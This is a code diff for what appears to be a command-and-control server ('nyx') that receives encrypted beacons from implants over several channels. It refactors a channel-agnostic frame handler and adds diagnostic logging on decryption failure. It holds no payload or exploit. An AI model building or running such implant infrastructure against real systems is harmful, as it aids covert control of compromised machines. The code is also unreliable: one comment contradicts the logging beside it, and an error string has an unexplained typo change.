@@ -666,7 +666,7 @@ fn handle_beacon(
             .duration_since(UNIX_EPOCH)
             .map(|d| d.as_secs())
             .map_err(|_| {
-                anyhow::anyhow!("clock before UNIX_EPOCH; kill-date check cannot run safely")
+                anyhow::anyhow!("clock before UNIXEPOCH; kill-date check cannot run safely")
             })?;
         if now >= kd {
             anyhow::bail!("kill date {kd} reached; refusing beacon");
@@ -718,6 +718,26 @@ fn handle_beacon(
         parse_frame(body)?
     };
 
+    // Delegate to the channel-agnostic core (spec-1). HTTP envelope inversion
+    // happened above; from here on the processing is identical for every channel.
+    handle_frame(st, peer, &raw)
+}
+
+/// Channel-agnostic beacon frame handler (spec-1).
+///
+/// This is the core processing path that ALL channels converge on. HTTP channels
+/// (HTTPS/DoH/External C2) extract the raw frame from their HTTP envelope in
+/// their handler, then call this. Raw-socket channels (SMB/TCP/DNS) extract the
+/// frame from their wire format and call this too.
+///
+/// `raw_frame` is an already-parsed `RawFrame` (from `parse_frame`) — the caller
+/// is responsible for any channel-specific unwrapping before calling this.
+fn handle_frame(
+    st: &AppState,
+    peer: &std::net::SocketAddr,
+    raw: &nyx_protocol::RawFrame,
+) -> anyhow::Result<Vec<u8>> {
+
     // Decide new-vs-existing and (for existing) grab the session key. This
     // read-guard counter check is ADVISORY only: it lets us skip the decrypt
     // for an obvious stale replay, but it is NOT the authoritative anti-replay
@@ -737,8 +757,28 @@ fn handle_beacon(
         }
     };
 
-    let plaintext =
-        open_frame(&key, &raw).map_err(|_| anyhow::anyhow!("frame decryption failed"))?;
+    let plaintext = open_frame(&key, raw).map_err(|_| {
+        // The overwhelmingly common cause of a tag mismatch here is key
+        // desynchronization: the implant performed ECDH against a server_pub
+        // that differs from this server's current long-term identity (stale
+        // NYX_SERVER_PUB on the dev agent, or a .nyx_cfg baked against a
+        // different/ephemeral keyfile). Because derive_session_key binds
+        // server_pub into both the HKDF-Extract salt and the expand info, ANY
+        // mismatch fails the AEAD tag deterministically. Log our current
+        // identity so the operator can diff it against what the implant was
+        // built/launched with — this turns a opaque "decryption failed" into a
+        // one-line diagnostic. (Do NOT log the implant's claimed pubkey at
+        // debug+ — it is attacker-controlled beacon input.)
+        let our_pub = hex::encode(st.keypair.public_bytes());
+        tracing::warn!(
+            implant_pub = %hex::encode(raw.pubkey),
+            this_server_pub = %our_pub,
+            "frame decryption failed; if the implant was built/launched with a \
+             different server_pub, regenerate it against this_server_pub (or fix \
+             NYX_SERVER_PUB) — see scripts/verify_implant_pub.sh"
+        );
+        anyhow::anyhow!("frame decryption failed")
+    })?;
 
     if is_new {
         // First message from an implant is always its SessionInfo (check-in).
